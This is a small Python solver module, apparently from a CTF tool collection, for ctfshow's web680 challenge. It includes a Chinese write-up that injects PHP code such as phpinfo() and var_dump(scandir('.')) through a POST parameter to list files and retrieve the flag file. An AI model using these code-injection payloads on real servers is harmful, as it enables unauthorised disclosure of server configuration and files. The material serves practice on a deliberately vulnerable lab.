 # -*- coding: utf-8 -*-
def info():
	info={
"questname":"web680",
"platform":"ctfshow",
"contest" : "none",
"description":"ctfshow webrumen dasaiyuanti web680.",
"requirements":"python requests",
"module options":[
	{"name":"url","required":True,"description":"full url."},
	]
}
	return(info)

def exploit(options):
	url=options['url']
	import requests
	if url[:7]!="http://" :
		url='http://'+url
	flag=requests.get(url.rstrip('/')+'/secret_you_never_know').text
	return(flag)


def make_wp():
	wp="""
post一个code=phpinfo();

获取到了phpinfo,可以看到设置了open_basedir和disabled_functions。

直接var_dump(scandir('.'));获取到了当前目录文件名，找到了"secret_you_never_know"这个文件，下载获得flag
"""
	return(wp)